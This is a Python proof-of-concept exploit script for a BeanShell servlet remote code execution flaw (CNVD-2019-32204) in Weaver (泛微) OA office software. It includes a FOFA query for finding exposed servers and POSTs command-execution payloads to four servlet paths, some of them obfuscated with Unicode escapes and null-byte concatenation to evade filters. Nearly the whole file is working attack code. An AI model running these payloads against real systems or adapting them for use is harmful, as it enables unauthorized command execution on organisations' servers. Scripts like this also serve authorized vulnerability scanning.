#!/usr/bin/env python3
# _*_ coding:utf-8 _*_

import requests
from Config.config_requests import headers
from requests.packages.urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

########################################################################################################################
# 脚本信息
NAME='CNVD_2019_32204'
AUTHOR="Faith"
REMARK='泛微OA Bsh 远程代码执行漏洞'
FOFA_RULE='app="泛微-协同办公OA"'
########################################################################################################################

def poc(target):
    result={}
    payload1 = "/bsh.servlet.BshServlet"
    payload2 = "/weaver/bsh.servlet.BshServlet"
    payload3 = "/weaveroa/bsh.servlet.BshServlet"
    payload4 = "/oa/bsh.servlet.BshServlet"

    data1 = '''bsh.script=exec("whoami");&bsh.servlet.output=raw'''
    data2 = '''bsh.script=\u0065\u0078\u0065\u0063("whoami");&bsh.servlet.captureOutErr=true&bsh.servlet.output=raw'''
    data3 = '''bsh.script=eval%00("ex"%2b"ec(bsh.httpServletRequest.getParameter(\\"command\\"))");&bsh.servlet.captureOutErr=true&bsh.servlet.output=raw&command=whoami'''

    for payload in (payload1,payload2,payload3,payload4):
        url = target + payload
        for data in (data1,data2,data3):
            try:
                r = requests.post(url,data=data,headers=headers,verify=False,timeout=3)
                if r.status_code == 200:
                    if ";</script>" not in r.content:
                        if "login.jsp" not in r.content:
                            if "Error" not in r.content:
                                result["target"] = target
                                result["poc"] = NAME
                                result["url"] = url
                                return result
                            else:
                                pass
            except:
                pass

if __name__ == '__main__':
    poc("http://127.0.0.1")